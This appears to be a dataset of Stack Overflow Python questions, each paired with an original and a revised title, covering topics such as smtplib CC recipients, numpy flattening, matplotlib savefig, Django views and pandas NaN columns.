[Python]: Mails not being sent to people in CC," I have the following script for sending mails using python When I use the script, I see that the mail gets delivered to both toaddr1 and toadd2However ccaddr1 and ccaddr2 does not receive the mail at all. Interestingly, when I check the mails received by toaddr1 and toadd2, it shows thatccaddr1 and ccaddr2 are present in CC.Is there any error in the script? Initially I thought that this might be an issue with my mail server. I tried it with Gmail and saw the same result. That is, no matter whether its an account in my current mail server or my Gmail account in the CC, the recipient will not receive the mail, even though the people in the 'To' field receive it properly and have the correct addresses mentioned in the CC field <code>  import smtplibfrom email.mime.multipart import MIMEMultipartfrom email.mime.text import MIMETextimport osFROMADDR = ""myaddr@server.com""PASSWORD = 'foo'TOADDR = ['toaddr1@server.com', 'toaddr2@server.com']CCADDR = ['ccaddr1@server.com', 'ccaddr2@server.com']# Create message container - the correct MIME type is multipart/alternative.msg = MIMEMultipart('alternative')msg['Subject'] = 'Test'msg['From'] = FROMADDRmsg['To'] = ', '.join(TOADDR)msg['Cc'] = ', '.join(CCADDR)# Create the body of the message (an HTML version).text = """"""Hi this is the body""""""# Record the MIME types of both parts - text/plain and text/html.body = MIMEText(text, 'plain')# Attach parts into message container.msg.attach(body)# Send the message via local SMTP server.s = smtplib.SMTP('server.com', 587)s.set_debuglevel(1)s.ehlo()s.starttls()s.login(FROMADDR, PASSWORD)s.sendmail(FROMADDR, TOADDR, msg.as_string())s.quit()",Mails not being sent to people in CC
How to run a Python script without specifying its full path," Is there a portable way to run a python script from a shell without writing its full path?For example in Linux, I would like while in my home directory to be able to run a python script called run.py that is in say, ~/long/path/to/run.py, but I want to run it by simply typing instead of I would hope for some kind of search path list that contains several directories just like the PATH variable, so that python run.py runs the first run.py it encounters in one of the directories.I have considered turning run.py into an executable and adding its directory the system PATH variable, but could not find a portable way of making a python script executable.EDITOne year later after asking it, I am a bit less noob, and I see that my question was not very clear and did not make much sense, so after a question upvote I'll clarify some things.1) Portable.When I asked this I said portable. However what portable means is not clear in this case, and I did not give much emphasis to it.the platforms: should work on POSIX (Linux, MacOS, etc.) and Windowsthis still does not make much sense since windows uses cmd.exe, and POSIX uses sh, so each one could run the commands with a different syntax. So let's say that the most portable thing possible would be to feed the same input to both sh and cmd.exe, running the python script in both cases. In this case, you could run the same command from an ANSI C system function, which uses sh on POSIX and cmd on Windows. ANSI C being one of the few things that is common to Windows and POSIX, the question makes some sense in that case.2) ExecutableNext, the phrase turning run.py into an executable, is not very clear. By that I was talking about the Linux strategy of chmod +x run.py, add a shebang #!/usr/bin/env python, and adding its directory the system add ~/long/path/to/ the PATH enviroment variable. But then this won't work for windows because windows does not support an executable file metadata property like Linux and because /usr/bin/env does not necessarily exist in Windows.3) ExtensionFinally, in my head I was hoping for a solution that does not specify what kind of file run is, so that if someday we decide to make it, say, a perl file, no interfaces would change.Therefore, writing run.py would be bad because it would specify the filetype; it would be better to be able to write just run <code>  cd ~ python run.py python ~/long/path/to/run.py",How to run a Python script portably without specifying its full path
How to run a Python script without specifying its full path portably," Is there a portable way to run a python script from a shell without writing its full path?For example in Linux, I would like while in my home directory to be able to run a python script called run.py that is in say, ~/long/path/to/run.py, but I want to run it by simply typing instead of I would hope for some kind of search path list that contains several directories just like the PATH variable, so that python run.py runs the first run.py it encounters in one of the directories.I have considered turning run.py into an executable and adding its directory the system PATH variable, but could not find a portable way of making a python script executable.EDITOne year later after asking it, I am a bit less noob, and I see that my question was not very clear and did not make much sense, so after a question upvote I'll clarify some things.1) Portable.When I asked this I said portable. However what portable means is not clear in this case, and I did not give much emphasis to it.the platforms: should work on POSIX (Linux, MacOS, etc.) and Windowsthis still does not make much sense since windows uses cmd.exe, and POSIX uses sh, so each one could run the commands with a different syntax. So let's say that the most portable thing possible would be to feed the same input to both sh and cmd.exe, running the python script in both cases. In this case, you could run the same command from an ANSI C system function, which uses sh on POSIX and cmd on Windows. ANSI C being one of the few things that is common to Windows and POSIX, the question makes some sense in that case.2) ExecutableNext, the phrase turning run.py into an executable, is not very clear. By that I was talking about the Linux strategy of chmod +x run.py, add a shebang #!/usr/bin/env python, and adding its directory the system add ~/long/path/to/ the PATH enviroment variable. But then this won't work for windows because windows does not support an executable file metadata property like Linux and because /usr/bin/env does not necessarily exist in Windows.3) ExtensionFinally, in my head I was hoping for a solution that does not specify what kind of file run is, so that if someday we decide to make it, say, a perl file, no interfaces would change.Therefore, writing run.py would be bad because it would specify the filetype; it would be better to be able to write just run <code>  cd ~ python run.py python ~/long/path/to/run.py",How to run a Python script portably without specifying its full path
"Andriod Back End Technology - Language (Java, Python) & IDE (CoderBuddy, exo Cloud, Cloud 9)"," I've done my research and narrowed this down. OK, so I am deciding on the language and and tool to use for backend (server side) of developing cloud based android applications.. I've decided on Google App Engine as my framework. As I am going to be developing on my android tablet I want a cloud based IDE. (I am going to use a native android IDE app for client side).App Engine supports the Go Programming Language, Java and Python. As there doesn't appear to be a stable cloud IDE that supports Go, I am left with Java & Python. I've narrowed my vast list of IDEs down to:Coderbuddy - (Designed for App Engine but Python only)exo Cloud - (Java & Python supported)Cloud 9 - (Java & Python supported)I know neither language. I have to learn Java in any case for Android client side development. I understand that Python is faster to code in and so that's definately a factor but I absolutely don't want to sacrifice performance or scalability. I will be doing lots of SQL database stuff.Finally if you think I am way off and should look in another direction please let me know. Thanks!Edit: My background language is Delphi (Object Pascal) <code> ","Android Back End Technology - Language (Java, Python) & IDE (CoderBuddy, exo Cloud, Cloud 9)"
How to make pylab.savefig() save image for 'maximized' window instead of default size," I am using pylab in matplotlib to create a plot and save the plot to an image file. However, when I save the image using pylab.savefig( image_name ), I find that the SIZE image saved is the same as the image that is shown when I use pylab.show().As it happens, I have a lot of data in the plot and when I am using pylab.show(), I have to maximize the window before I can see all of the plot correctly, and the xlabel tickers don't superimpose on each other.Is there anyway that I can programmatically 'maximize' the window before saving the image to file? - at the moment, I am only getting the 'default' window size image, which results in the x axis labels being superimposed on one another. <code> ",How to make savefig() save image for 'maximized' window instead of default size
How to flatten axes of a multidimensional without making copies in NumPy?," I am wondering if there is a way to flatten a multidimensional array (i.e., of type ndarray) along given axes without making copies in NumPy. For example, I have an array of 2D images and I wish to flatten each to a vector. So, one easy way to do it is numpy.array([im.flatten() for im in images]), but that creates copies of each.  <code> ",How to flatten axes of a multidimensional array without making copies in NumPy?
"better way to iterate two , multiple lists at once"," Let's say I have two or more lists of same length. What's a good way to iterate through them?a, b are the lists. or or is there any variant I am missing?Is there any particular advantages of using one over other? <code>  for i, ele in enumerate(a): print ele, b[i] for i in range(len(a)): print a[i], b[i]",What is the best way to iterate over multiple lists at once?
Better way to iterate over two or multiple lists at once," Let's say I have two or more lists of same length. What's a good way to iterate through them?a, b are the lists. or or is there any variant I am missing?Is there any particular advantages of using one over other? <code>  for i, ele in enumerate(a): print ele, b[i] for i in range(len(a)): print a[i], b[i]",What is the best way to iterate over multiple lists at once?
Ubunty Chrome: How to read a cookie from a python script," I am creating a little application that has two parts: One of them is displayed inside a Chrome browser and the other is a local application programmed in Python.In Chrome, the user has a <select> to choose his/her preferred language. That information is stored by Chrome in a cookie.I would like to know if it's possible to retrieve that language preference (meaning, reading the cookie) so when I run the local application, it will be displayed on the same language the user already selected with Chrome.I can not change the system's locale, though (which is what would probably make the most sense). That has to remain in English, but if the user selects Chinese as preferred language through Chrome, and then launches the local application, I would like that application to be able to start in Chinese.I've been looking at the command line switches for Chrome, but I haven't seen anything too helpful. At most, the --enable-file-cookies option, and then try to open and parse the cookie file... somehow, but all the information I've been able to find is pretty vague. Thank you in advance!Update. Further searching (1, 2) seems to indicate that Chrome stores the cookies using SQL lite. I am looking into this. Maybe there's hope with that... <code> ",Ubuntu Chrome: How to read a cookie from a python script
What's the difference between *pip install* and *python setup.py install*?," I like to figure out the myth behind Python's namespace packages by setuptools, and here is what I did test.Make a virtual environment by virtualenv.Find a namespaced package on PyPI.Install that package by pip install.Check the installed file hierarchy.The package I played with is zope.interface and it worked well with the following file hierarchy on my virtualenv: Everything looked fine and I love the way zope.interface got installed as a real namespaced package (under folder zope).Then, I did another test and that's the question I would like to ask for your help. I downloaded the tared zope.interface source file. I liked to play it manually againMake a virtual environment by virtualenv.Untar the zope.interface into somewhere.Install the package by python setup.py install.Go check what happened in site-packages.The site-packages looks like this: Q. How come I can't get the exactly result to pip install by manually python setup.py install? <code>  ~virenv/.../site-packages/zope.interface-3.8.0-py2.6-nspkg.pth /zope.interface-3.8.0-py2.6.egg-info/ /zope/ /interface/ /... ~virenv/../site-packages/zope.interface-...egg/ /zope/ /__init__.py /interface/ /EGG-INFO/",How come I can't get the exactly result to *pip install* by manually *python setup.py install*?
How to do a HTTP DELETE request with Requests library [Python]," I'm using the requests package for interacting with the toggl.com API. I can perform GET and POST requests: but i cant seem to find a way to perform a DELETE request. Is this possible?  <code>  payload = {'some':'data'} headers = {'content-type': 'application/json'} url = ""https://www.toggl.com/api/v6/"" + data_description + "".json"" response = requests.post(url, data=json.dumps(payload), headers=headers,auth=HTTPBasicAuth(toggl_token, 'api_token'))",How to do a HTTP DELETE request with Requests library
Send bash environment back to python fabric," I am attempting to pass a bash environment variable back into my fabric function like this:- But it doesn't seem to be able to retrieve the stdout results and assign it to my python project_home variable. What's the correct way to do this right? <code>  from fabric.api import envdef env_localhost(): ""All the environment variables relating to your localhost"" project_home = local('echo $PROJECT_HOME') print 111, project_home",Send bash environment variable back to python fabric
How get sublayers from group layer with python in gimp," I have an XCD file with a nested layers structure: I open the file with image = pdb.gimp_file_load(xcf_file, xcf_file) and can get front-layer, content-layer and back-layer as image.layers[0], image.layers[1] and image.layers[2]. But Gimp can't get sublayers in content-layer by list index.I can use pdb.gimp_image_get_layer_by_name(image, 'content-layer-name-3'), but I don't known the layers' names.I try pdb.gimp_item_get_children(image.layers[1]), but this method return INT32ARRAY with the item's list of children and I haven't found how retrieve the item by its id.How can I get sublayers from a group layer with Python in Gimp (2.8)? <code>  image front-layer content-layer content-layer-name-1 content-layer-name-2 content-layer-name-3 back-layer",Get sublayers from group layer with Python in Gimp
Index of a regex," If I have: I want to be able to handle multiple parentheses within parentheses for a math reader I'm writing. Perhaps I'm going about this the wrong way, but my goal was to recursively go deeper into the parentheses until there were none, and then I would perform the math operations. Thus, I would first want to focus on then focus on I hoped to do this by assigning the focus value to the start index of the regex and the end index of the regex. I have yet to figure out how to find the end index, but I'm more interested in first matching the regex failed to match. I wanted it to read as ""any one or more characters contained within a set of parentheses"". Could someone explain why the above expression will not match to the above statement in python? <code>  statement = ""(2*(3+1))*2"" ""(2*(3+1))"" ""(3+1)"" r""\(.+\)"" ",Use regular expression to handle nested parenthesis in math equation?
can you interrupt a running python program in pdb?," In gdb, you can interrupt(pause) the program by C-c and resume. Can you do this in pdb?  <code> ",Interrupt (pause) running Python program in pdb?
Python C-API reference counting aberrations," The standard convention in the Python C-API is thatfunctions do not steal references from input arguments (that are objects)return values and output arguments (that are objects) own a referenceMost functions in the Python C-API follow this convention. However, there are some exceptions. I have come across the following:Functions that steal a reference from an input argument Functions with return values or output arguments that borrow a reference Is there a comprehensive list of such functions anywhere? Such a list would be a useful reference when writing Python extension modules. <code>  PyModule_AddObject PyErr_OccurredPyTuple_GetItemPyTuple_GETITEMPyDict_GetItemPyDict_GetItemStringPyDict_Next",Python C-API functions that borrow and steal references
When makes a user-defined class unhashable?," The docs say that a class is hashable as long as it defines __hash__ method and __eq__ method. However: What makes X unhashable?Note that I must have identical lists (in terms of regular equality) to be hashed to the same value; otherwise, I will violate this requirement on hash functions: The only required property is that objects which compare equal have the same hash valueThe docs do warn that a hashable object shouldn't be modified during its lifetime, and of course I don't modify instances of X after creation. Of course, the interpreter won't check that anyway. <code>  class X(list): # read-only interface of `tuple` and `list` should be the same, so reuse tuple.__hash__ __hash__ = tuple.__hash__x1 = X()s = {x1} # TypeError: unhashable type: 'X'",What makes a user-defined class unhashable?
python list example," I am having a list as : if I use join statement, will give me output as : But, what I have to do If I want output as : (I know that I can use string concat but I want to know some better way) . <code>  >>> l = ['1', '2', '3', '4'] >>> s = ', '.join(l) '1, 2, 3, 4' '1, 2, 3, 4,'",Concatenate or print list elements with a trailing comma in Python
PyCharm - how to select Python version?," I have PyCharm 1.5.4 and have used the ""Open Directory"" option to open the contents of a folder in the IDE.I have Python version 3.2 selected (it shows up under the ""External Libraries"" node).How can I select another version of Python (that I already have installed on my machine) so that PyCharm uses that version instead? <code> ",How to select Python version in PyCharm?
How to transform this in OpenCV?," This question is related to this question: How to remove convexity defects in sudoku squareI was trying to implement nikie's answer in Mathematica to OpenCV-Python. But i am stuck at the final step of procedure. ie I got the all intersection points in square like below:Now, i want to transform this into a perfect square of size (450,450) as given below:(Never mind the brightness difference of two images).Question:How can i do this in OpenCV-Python? I am using cv2 version. <code> ",Image transformation in OpenCV
Python List Comprehension (list to list of lists)," Possible Duplicate: How do you split a list into evenly sized chunks in Python? python: convert “5,4,2,4,1,0” into [[5, 4], [2, 4], [1, 0]] -> Are there simple way to do it, without explicit 'for'? <code>  [1,2,3,4,5,6,7,8,9] [[1,2,3],[4,5,6],[7,8,9]]",How to split python list into chunks of equal size?
Django - Catch agrument in Class based FormView," On my page, i need to display the post detail and a comment form for viewer to post comment. I created 2 generic views: Error would occur in the AddCommentView,since I haven't specified the post's id for the comment. How can I access the post_id in the AddCommentView?  <code>  # views.pyclass PostDetailView (DetailView): model = Post context_object_name = 'post' template_name = 'post.html' def get_context_data(self, **kwargs): context = super(PostDetailView, self).get_context_data(**kwargs) context['comment_form'] = CommentForm() return contextclass AddCommentView(FormView): template_name = 'post.html' form_class = CommentForm success_url = '/' def form_valid(self, form): form.save() return super(AddCommentView, self).form_valid(form) def form_invalid(self, form): return self.render_to_response(self.get_context_data(form=form))detail = PostDetailView.as_view()add_comment = AddCommentView.as_view()# urls.py ....url(r'^(?P<pk>\d+)/$', view='detail'),url(r'^(?P<post_id>\d+)/add_comment/$', view='add_comment'),....",Django - Catch argument in Class based FormView
Why is Photoimage put slow?," When manipulating PhotoImage objects with: The put operation takes a very long time. Is there a faster method of doing this? <code>  import tkinter as tkimg = tk.PhotoImage(file=""myFile.gif"")for x in range(0,1000): for y in range(0,1000): img.put(""{red}"", (x, y))",Why is Photoimage put() slow?
Ruby on rails equivalent in python," I've no experience with Ruby but I heard that Ruby on Rails is a great framework to build websites super fast. What's its equivalent in python? If there's none, which of the existing python website building frameworks come closer to it?  <code> ",Ruby on Rails equivalent in python
Is t her any Python IDE that do not need Admin for installing?, We need admin for installing some software which it will take nearly a month for them to install for us. So I want to find some Python IDE that can install without admin (Windows 7). Any suggest? <code> ,Is there any Python IDE that do not need Admin for installing?
"matplotlib, define size of a grid on a plot"," I am plotting using Matplotlib in Python. I want create plot with grid, and here is an example from a plotting tutorial. In my plot range if the y axis is from 0 to 14 and if I use pylab.grid(True) then it makes a grid with the size of square of two, but I want the size to be 1. How can I force it? <code> ",Define the size of a grid on a plot using Matplotlib
Extra line in output when using enumerate function," I can't figure out why the code #1 returns an extra empty line while code #2 doesn't. Could somebody explain this? The difference is an extra comma at the end of the code #2. Here is the content of my tasks.txt file: Result from code #1: Result from code #2 (desired result): <code>  # Code #1file = open('tasks.txt')for i, text in enumerate(filer, start=1): if i >= 2 and i <= 4: print ""(%d) %s"" % (i, text)# Code #2file = open('tasks.txt')for i, text in enumerate(filer, start=1): if i >= 2 and i <= 4: print ""(%d) %s"" % (i, text), line 1line 2line 3line 4line 5 (2) line 2(3) line 3(4) line 4 (2) line 2(3) line 3(4) line 4",Extra line in output when printing inside a loop
Python : How to avoid RuntimeWarmings in function definition?," i designed a simple function to return a mathematical function which can be used to fit experimental data to it. The functions looks pretty much like the following: Unfortunately I run into troubles with RunTimeWarnings as: due to values that are too large or small. I am not able to figure this problem out on my own though. Is there any way to redefine my function so it will pass without warnings? <code>  def colecole_2(f,*p): term1=p[0] * ( 1 - 1 / (1 + numpy.power((0+1j) * 2 * numpy.pi * f * p[1], p[2]))) term2=p[3] * ( 1 - 1 / (1 + numpy.power((0+1j) * 2 * numpy.pi * f * p[4], p[5]))) return p[6]*(1-abs( term1+ term2)) RuntimeWarning: overflow encountered in powerRuntimeWarning: overflow encountered in divide",Python : How to avoid numpy RuntimeWarning in function definition?
Python : How to avoid RuntimeWarning in function definition?," i designed a simple function to return a mathematical function which can be used to fit experimental data to it. The functions looks pretty much like the following: Unfortunately I run into troubles with RunTimeWarnings as: due to values that are too large or small. I am not able to figure this problem out on my own though. Is there any way to redefine my function so it will pass without warnings? <code>  def colecole_2(f,*p): term1=p[0] * ( 1 - 1 / (1 + numpy.power((0+1j) * 2 * numpy.pi * f * p[1], p[2]))) term2=p[3] * ( 1 - 1 / (1 + numpy.power((0+1j) * 2 * numpy.pi * f * p[4], p[5]))) return p[6]*(1-abs( term1+ term2)) RuntimeWarning: overflow encountered in powerRuntimeWarning: overflow encountered in divide",Python : How to avoid numpy RuntimeWarning in function definition?
Django - Storing objects in Session," Is it a good practice to store Objects in Session instead of their id ?Will it be ""picklable"" enough to be used in templates for example ? <code>  class Book(models.Model): author = models.ForeignKey(User) name = models.CharField(max_length=100)def view(request): book = Book.objects.get(pk=1) request.session['selected_book'] = book <div>{{ request.session.book.author.name }}</div>",Django - Is storing objects in session a good practice?
Django - Is Storing objects in Session a good practice?," Is it a good practice to store Objects in Session instead of their id ?Will it be ""picklable"" enough to be used in templates for example ? <code>  class Book(models.Model): author = models.ForeignKey(User) name = models.CharField(max_length=100)def view(request): book = Book.objects.get(pk=1) request.session['selected_book'] = book <div>{{ request.session.book.author.name }}</div>",Django - Is storing objects in session a good practice?
longest chain Python," I have a list of nations, and I want to have the longest path of nations where each country chosen must begin with the same letter that ended the previous element I tried this way, but it doesn't work Any suggestion? <code>  nations = ['albania','andorra','austria','belarus','belgium','bosnia and herzegovina', 'bulgaria','croatia','czech republic','denmark','estonia', 'finland','france','germany','greece','hungary', 'iceland','ireland','italy','latvia','liechtenstein','lithuania','luxembourg', 'macedonia','malta','moldova','monaco','montenegro','netherlands', 'norway','poland','portugal','romania','russia', 'san marino','serbia','slovakia','slovenia','spain','sweden', 'switzerland', 'ukraine','united kingdom','vatican city'] chain('spain')>>>['spain', 'netherlands', 'slovenia', 'andorra', 'austria', 'albania'] def chain(naz): initial = naz[-1] initials=[] res = set() res.add(naz) for i in nations: if i.startswith(initial): initials.append(i) for j in initials: nations.remove(j) res.add(j) chain(j) return res",Longest chain of elements from list in Python
Django-Pinax : How do you use a pinax app once you have started with a pinax base project?," I am trying to understand Pinax and plan to use it in my next project.I have started with a pinax basic project, and now I have something to go with runserver.Now, I understand that I can customize the initial setup that I got from pinax and customize the profiles, themes, etc as per my requirements.But is that all that pinax provides ?I am very confused here, like I want to use the pinax phileo app in my project, so how does pinax helps me do that ?My Effort :I searched and found that I have to install it with pip install phileoThen, add it to INSTALLED_APPS and use it as required.But what did pinax do in this ?Pinax has phileo featured on its website, but why ? Since I could have used it just like any other app on my non-pinax django project.So, my question in a nutshell is :What does pinax provide after a base project and default templates that come with pinax ?Right, now it feels like pinax just provides a base project with some apps already working with some default templates. [ That's it ? ]Then, what about other apps featured on pinax's website that do not come with base projects ?Please, help clear up the confusion !UpdateMy question is somewhat - What is the significance of pinax-ecosystem when we already have them listed somewhere like djangopackages.com ?  <code> ",Django-Pinax : How do you use a pinax app apart from what you get with a pinax base project?
Speed and memory efficiency," I'm using numpy.delete to remove elements from an array that is inside a while loop.This while loop is valid only if the array is not empty. This code works fine but slows down considerably when the array has over 1e6 elements. Here is an example: I've tried to make this code efficient but I cannot find a good way to speed up the while loop. The bottleneck here is, I think, the delete which must involve a copy of some kind. I've tried using masked array in order to avoid copying but I'm not that good at python and masked array are not that easy to search. Is there a good and fast way to use delete or replace it so that 7e6 elements can be handled by the loop above without taking 24 hours?Thanks <code>  while(array.shape[0] > 0): ix = where((array >= x) & (array <= y))[0] array = delete(array,ix,None)",Improving performance of operations on a NumPy array
Python Class Inheritance Attribute Error," Similar questions on SO include: this one and this. I've also read through all the online documentation I can find, but I'm still quite confused. I'd be grateful for your help.I want to use the Wand class .wandtype attribute in my CastSpell class lumus method. But I keep getting the error ""AttributeError: 'CastSpell' object has no attribute 'wandtype'."" This code works: This code, with attempted inheritance, doesn't. I've tried using the super() method to no avail. I'd really appreciate your help understanding a) why class inheritance isn't working in this case, b) how to get it to work.  <code>  class Wand(object): def __init__(self, wandtype, length): self.length = length self.wandtype = wandtype def fulldesc(self): print ""This is a %s wand and it is a %s long"" % (self.wandtype, self.length) class CastSpell(object): def __init__(self, spell, thing): self.spell = spell self.thing = thing def lumus(self): print ""You cast the spell %s with your wand at %s"" %(self.spell, self.thing) def wingardium_leviosa(self): print ""You cast the levitation spell.""my_wand = Wand('Phoenix-feather', '12 inches') cast_spell = CastSpell('lumus', 'door') my_wand.fulldesc() cast_spell.lumus() class Wand(object): def __init__(self, wandtype, length): self.length = length self.wandtype = wandtype def fulldesc(self): print ""This is a %s wand and it is a %s long"" % (self.wandtype, self.length) class CastSpell(Wand): def __init__(self, spell, thing): self.spell = spell self.thing = thing def lumus(self): print ""You cast the spell %s with your %s wand at %s"" %(self.spell, self.wandtype, self.thing) #This line causes the AttributeError! print ""The room lights up."" def wingardium_leviosa(self): print ""You cast the levitation spell.""my_wand = Wand('Phoenix-feather', '12 inches') cast_spell = CastSpell('lumus', 'door') my_wand.fulldesc() cast_spell.lumus() ",Python Class Inheritance AttributeError - why? how to fix?
Generate a list of datetimes between an interval in python," Given two datetimes (start_date and end_date), I'd like to generate a list of other datetimes between these two dates, the new datetimes being separated by a variable interval. e.g. every 4 days between 2011-10-10 and 2011-12-12 or every 8 hours between now and tomorrow 19p.m.Maybe something roughly equivalent to the Dateperiod PHP class.What would be the most efficient way to accomplish this in Python? <code> ",Generate a list of datetimes between an interval
Python: Sort a List of tuples by an integer value in tuples," I have a list of tuples that looks something like this: I want to sort this list in ascending order by the integer value inside the tuples. Is it possible? <code>  [('abc', 121),('abc', 231),('abc', 148), ('abc',221)]",Sort a list of tuples by 2nd item (integer value)
python send POST with header," I try to build a python script who sends a POST with parameters for extracting the result.With fiddler, I have extracted the post request who return that I want. The website uses https only. And now my python script: But when I run my script, I have this error: <code>  POST /Services/GetFromDataBaseVersionned HTTP/1.1Host: www.mywbsite.fr""Connection"": ""keep-alive"",""Content-Length"": 129,""Origin"": ""https://www.mywbsite.fr"",""X-Requested-With"": ""XMLHttpRequest"",""User-Agent"": ""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5"",""Content-Type"": ""application/json"",""Accept"": ""*/*"",""Referer"": ""https://www.mywbsite.fr/data/mult.aspx"",""Accept-Encoding"": ""gzip,deflate,sdch"",""Accept-Language"": ""fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4"",""Accept-Charset"": ""ISO-8859-1,utf-8;q=0.7,*;q=0.3"",""Cookie"": ""ASP.NET_SessionId=j1r1b2a2v2w245; GSFV=FirstVisit=; GSRef=https://www.google.fr/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CHgQFjAA&url=https://www.mywbsite.fr/&ei=FZq_T4abNcak0QWZ0vnWCg&usg=AFQjCNHq90dwj5RiEfr1Pw; HelpRotatorCookie=HelpLayerWasSeen=0; NSC_GSPOUGS!TTM=ffffffff09f4f58455e445a4a423660; GS=Site=frfr; __utma=1.219229010.1337956889.1337956889.1337958824.2; __utmb=1.1.10.1337958824; __utmc=1; __utmz=1.1337956889.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)""{""isLeftColumn"":false,""lID"":-1,""userIpCountryCode"":""FR"",""version"":null,""languageCode"":""fr"",""siteCode"":""frfr"",""Quotation"":""eu""} #!/usr/bin/env python# -*- coding: iso-8859-1 -*-import stringimport httplibimport urllib2host = ""www.mywbsite.fr/sport/multiplex.aspx"" params='""isLeftColumn"":""false"",""liveID"":""-1"",""userIpCountryCode"":""FR"",""version"":""null"",""languageCode"":""fr"",""siteCode"":""frfr"",""Quotation"":""eu""'headers = { Host: www.mywbsite.fr,""Connection"": ""keep-alive"",""Content-Length"": 129,""Origin"": ""https://www.mywbsite.fr"",""X-Requested-With"": ""XMLHttpRequest"",""User-Agent"": ""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5"",""Content-Type"": ""application/json"",""Accept"": ""*/*"",""Referer"": ""https://www.mywbsite.fr/data/mult.aspx"",""Accept-Encoding"": ""gzip,deflate,sdch"",""Accept-Language"": ""fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4"",""Accept-Charset"": ""ISO-8859-1,utf-8;q=0.7,*;q=0.3"",""Cookie"": ""ASP.NET_SessionId=j1r1b2a2v2w245; GSFV=FirstVisit=; GSRef=https://www.google.fr/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CHgQFjAA&url=https://www.mywbsite.fr/&ei=FZq_T4abNcak0QWZ0vnWCg&usg=AFQjCNHq90dwj5RiEfr1Pw; HelpRotatorCookie=HelpLayerWasSeen=0; NSC_GSPOUGS!TTM=ffffffff09f4f58455e445a4a423660; GS=Site=frfr; __utma=1.219229010.1337956889.1337956889.1337958824.2; __utmb=1.1.10.1337958824; __utmc=1; __utmz=1.1337956889.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)""}url = ""/Services/GetFromDataBaseVersionned""# POST the requestconn = httplib.HTTPConnection(host,port=443)conn.request(""POST"",url,params,headers)response = conn.getresponse()data = response.read()print data socket.gaierror: [Errno -2] Name or service not known",Python send POST with header
python metaclasses to override __str__ and __repr__ of complex builtin," As a learning exercise, I'm trying to implement a class which will emulate the behavior of python's complex builtin, but with different behavior of the __str__ and __repr__ methods: I want them to print in the format... ...instead of: I first tried simply subclassing from complex and redefining __str__ and __repr__, but this has the problem that when non-overridden methods are called, a standard complex is returned, and printed in the standard format: When the desired output is (3.0,4.0).I was reading about metaclasses and thought they would solve my problem. Starting from the answer in Python Class Decorator, my current implementation is as follows: Unfortunately, this seems to have the same behavior as the previous solution (e.g. when two ComplexWrapper instances are added to each other). I admit, I don't fully understand metaclasses. Maybe my problem can be solved in a different way?Of course, I could manually redefine the relevant methods such as __add__, __subtract__, etc. But that would be very repetitive, so I would prefer a more elegant solution.Any help appreciated.EDIT: Response to agf's answer:So a number of things I don't understand about your code:Where does the __new__ method of the ReturnTypeWrapper metaclass get its arguments from? If they are passed automatically, I would expect in this case that name = ""Complex"", bases = (complex), dict = {}. Is that correct? Is this method of automatic passing of class data specific to metaclasses?Why do you use cls = type.__new__(mcs, name, bases, dct) instead of cls = type(mcs, name, bases, dct)?Is it just to avoid confusion with the ""other meaning"" of type()?I copied your code, and added my special implementations of __str__ and __repr__ in your ComplexWrapper class. But it doesn't work; printing any object of type Complex just prints in the standard Python format. I don't understand that, as the two methods should have been picked up in the for loop of the metaclass, but should have been overridden by my definitions afterward.The relevant section of my code: And its behavior: Thanks again for your answer and feel free to edit/remove the above if you address them in your answer! <code>  (1.0,2.0) (1+2j) >>> a = ComplexWrapper(1.0,1.0)>>> a(1.0,1.0)>>> b = ComplexWrapper(2.0,3.0)>>> b(2.0,3.0)>>> a + b(3+4j) def complex_str(z): return '(' + str(z.real) + ',' + str(z.imag) + ')'def complex_repr(z): return '(' + repr(z.real) + ',' + repr(z.imag) + ')'class CmplxMeta(type): def __new__(cls, name, bases, attrs): attrs['__str__'] = complex_str attrs['__repr__'] = complex_repr return super(CmplxMeta, cls).__new__(cls, name, bases, attrs)class ComplexWrapper(complex): __metaclass__ = CmplxMeta class Complex(complex): __metaclass__ = ReturnTypeWrapper wrapped_base = complex def __str__(self): return '(' + str(self.real) + ',' + str(self.imag) + ')' def __repr__(self): return '(' + repr(self.real) + ',' + repr(self.imag) + ')' >>> type(a)<class 'Cmplx2.Complex'>>>> a.__str__<bound method Complex.wrapper of (1+1j)>>>> a.__str__()'(1+1j)'>>> ",Using metaclasses to override methods of complex builtin
Google App Enngine vs WebFaction," Possible duplicates:GAE + Python vs Webfaction + Python + django - for a relative new devHello,I am developing one of my hobby project using django-nonrel on google app engine. The basic part of the application is finished. Now for the some advance features I need to use:Comet for Facebook like real time tickerdjango-filetransfer for storing article with images and serving corresponding image when someone reading article10-30 minutes of video contents once above two are done (Not decided yet whether there will be any limit of total videos on web application since thinking to make it possible to allow users to upload)So my questions are:I need comet for each and every user using my application and since GAE is having limitation on creation and free quota for channel creation and maximum rate(6 creations/minute). Is it going to cost me more if I host my application on GAE ? Does other hosting services such as WebFaction and Linode also charge if our application uses reverse Ajax ?Since uploading images with article using django-filetransfers require me to enable billing, Is it the same case with other hosting services ?Is GAE (as compared with WebFaction, linode or any other hosting sites) is cost-effective for application which allows users to upload video contents ?P.S.Since I have used django-nonrel, hence at this point can easily change my hosting site. Once I start working on above mentioned functionality, it will be difficult for me move from one hosting site to another. Due to which I want to take best possible step. Also, I am from India and here paying 1 unit of Dollar will cost me more than 50 unit of Indian currency. So love to here the best deal with no compromise on performance :-)Thanks for your time,Sunil <code> ",Google App Engine vs WebFaction
Make background gradient color for sublot," How can I create some gradient color in matplotlib and then set the parameter axisbg of my subplot to this? <code>  f = plt.figure()ax = f.add_subplot(111, axisbg='green')",Subplot background gradient color
ElementTree xpath: find by text, Given an XML like the following: How can I match the element with content A using ElementTree and its support for XPath? Thanks <code>  <root> <element>A</element> <element>B</element></root>,Find element by text with XPath in ElementTree
Remove NULL columns in a dataframe Pandas?, I have a dataFrame in pandas and several of the columns have all null values. Is there a built in function which will let me remove those columns? <code> ,Remove NaN/NULL columns in a Pandas dataframe?
